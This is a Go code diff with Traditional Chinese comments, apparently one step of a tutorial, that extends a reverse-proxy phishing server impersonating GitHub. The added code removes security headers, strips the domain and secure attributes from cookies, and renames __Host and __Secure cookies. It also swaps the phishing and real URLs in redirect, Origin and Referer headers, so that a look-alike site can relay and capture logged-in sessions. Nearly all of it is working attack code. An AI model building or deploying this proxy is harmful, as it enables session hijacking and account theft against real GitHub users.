@@ -23,9 +23,55 @@ func main() {
 
 func handler(w http.ResponseWriter, r *http.Request) {
 	req := cloneRequest(r)
-	body, header := sendReqToUpstream(req)
+
+	body, header, statusCode := sendReqToUpstream(req)
+
+	// Set-Cookie 之前已經有複製而且取代 secure, domain 了
+	// 所以複製除了 Set-Cookie 之外的 header
+	for k := range header {
+		if k != "Set-Cookie" {
+			value := header.Get(k)
+			w.Header().Set(k, value)
+		}
+	}
+	// 把安全性的 header 統統刪掉
+	w.Header().Del("Content-Security-Policy")
+	w.Header().Del("Strict-Transport-Security")
+	w.Header().Del("X-Frame-Options")
+	w.Header().Del("X-Xss-Protection")
+	w.Header().Del("X-Pjax-Version")
+	w.Header().Del("X-Pjax-Url")
+
+	//fmt.Println(header["Set-Cookie"])
+
+	// 用 range 把 header 中的 Set-Cookie 欄位全部複製給瀏覽器的 header
+	for _, v := range header["Set-Cookie"] {
+		// 把 domain=.github.com 移除
+		newCookieValue := strings.Replace(v, "domain=.github.com;", "", -1)
+		// 把 secure 移除
+		newCookieValue = strings.Replace(newCookieValue, "secure;", "", 1)
+		// 幫 cookie 改名
+		// __Host-user-session -> XXHost-user-session
+		// __Secure-cookie-name -> XXSecure-cookie-name
+		//fmt.Println("newCookieValue:" + newCookieValue)
+		newCookieValue = strings.Replace(newCookieValue, "__Host", "XXHost", -1)
+		newCookieValue = strings.Replace(newCookieValue, "__Secure", "XXSecure", -1)
+
+		w.Header().Add("Set-Cookie", newCookieValue)
+	}
 	body = replaceURLInResp(body, header)
+
+	// 如果 status code 是 3XX 就取代 Location 網址
+	if statusCode >= 300 && statusCode < 400 {
+		location := header.Get("Location")
+		newLocation := strings.Replace(location, upstreamURL, phishURL, -1)
+		w.Header().Set("Location", newLocation)
+	}
+
+	// 轉傳正確的 status code 給瀏覽器
+	w.WriteHeader(statusCode)
 	w.Write(body)
+
 }
 
 func cloneRequest(r *http.Request) *http.Request {
@@ -42,12 +88,38 @@ func cloneRequest(r *http.Request) *http.Request {
 	if err != nil {
 		panic(err)
 	}
+
+	// 把原請求的 cookie 複製到 req 的 cookie 裡面
+	// 這樣請求被發到 Github 時就會帶上 cookie
+	//req.Header["Cookie"] = r.Header["Cookie"]
+
+	// 複製整個 request header
+	req.Header = r.Header
+
+	for i, value := range req.Header["Cookie"] {
+		// 取代 cookie 名字
+		newValue := strings.Replace(value, "XXHost", "__Host", -1)
+		newValue = strings.Replace(newValue, "XXSecure", "__Secure", -1)
+		req.Header["Cookie"][i] = newValue
+	}
+
+	// 取代 header 中的 Origin, Referer 網址
+	origin := strings.Replace(r.Header.Get("Origin"), phishURL, upstreamURL, -1)
+	referer := strings.Replace(r.Header.Get("Referer"), phishURL, upstreamURL, -1)
+	req.Header.Set("Origin", origin)
+	req.Header.Set("Referer", referer)
+	req.Header.Del("Accept-Encoding")
+
 	return req
 }
 
-func sendReqToUpstream(req *http.Request) ([]byte, http.Header) {
+func sendReqToUpstream(req *http.Request) ([]byte, http.Header, int) {
+	checkRedirect := func(r *http.Request, via []*http.Request) error {
+		return http.ErrUseLastResponse
+	}
+
 	// 建立 http client
-	client := http.Client{}
+	client := http.Client{CheckRedirect: checkRedirect}
 
 	// client.Do(req) 會發出請求到 Github、得到回覆 resp
 	resp, err := client.Do(req)
@@ -61,7 +133,7 @@ func sendReqToUpstream(req *http.Request) ([]byte, http.Header) {
 		panic(err)
 	}
 	resp.Body.Close()
-	return respBody, resp.Header
+	return respBody, resp.Header, resp.StatusCode
 }
 
 func replaceURLInResp(body []byte, header http.Header) []byte {
